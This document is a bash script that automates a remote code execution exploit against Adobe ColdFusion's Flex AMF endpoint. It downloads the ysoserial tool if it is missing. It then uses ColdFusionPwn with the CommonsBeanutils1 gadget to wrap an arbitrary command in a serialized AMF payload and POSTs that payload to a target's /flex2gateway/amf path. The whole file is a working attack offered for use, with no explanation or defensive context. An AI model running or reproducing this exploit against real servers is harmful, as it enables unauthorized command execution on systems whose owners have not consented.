#!/bin/bash
rm -f working.amf
HOST=$1
CMD=$2
FILE=ysoserial-master-SNAPSHOT.jar
if [ -f "$FILE" ]; then
 echo "YSO Found"
else 
    echo "$FILE does not exist"
    wget "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"
fi
java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 "$CMD" working.amf
curl -sk -X POST --data-binary "@working.amf" $HOST/flex2gateway/amf
